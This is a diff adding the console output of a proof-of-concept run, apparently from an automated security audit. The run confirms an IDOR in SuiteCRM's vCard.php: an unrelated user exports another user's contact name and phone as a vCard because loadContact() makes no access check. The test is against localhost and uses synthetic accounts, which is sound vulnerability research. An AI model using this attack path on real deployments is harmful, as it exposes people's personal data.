@@ -1,0 +1,17 @@
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-004/../.venv
+<frozen site>:107: RuntimeWarning: Unexpected value in sys.exec_prefix, expected /opt/cvehunter/claude_audit/SuiteCRM/exploits/.venv, got /opt/cvehunter/claude_audit/SuiteCRM/exploits/VULN-004/../.venv
+========================================================================
+VULN-004: vCard.php cross-user PII export via ACL-less loadContact() (IDOR)
+target: http://localhost:33116
+========================================================================
+[SETUP] admin web login; provisioning victim (V) and attacker (A)
+[INFO] victim   = mod_4379c4f3 (9affe1b4-6750-4e0b-bccf-a90efecd7557)
+[INFO] attacker = mod_ae63169a (a898bfce-f04a-4ae2-afb3-544a18bd7c5a)
+[SETUP] as V: create a Contact with a unique name + phone marker, owned by V
+[OK] Contact created: 11a02f59-4829-4f33-b400-f8c20faedc21 last_name='V004Contact_463c880b' phone_work='555-26e83a', owned by V
+[STEP] as A (zero relationship to V's Contact): export it as a vCard
+[PROOF] status=200 Content-Type='text/x-vcard; charset=UTF-8'
+[PROOF] victim last_name 'V004Contact_463c880b' present in vCard: True
+[PROOF] victim phone_work marker '555-26e83a' present in vCard: True
+[OK] attacker downloaded a text/x-vcard; charset=UTF-8 vCard containing V's name + phone
+==> VULN-004: CONFIRMED — attacker exported V's Contact PII (name=V004Contact_463c880b, phone=555-26e83a) via vCard, no ACL check
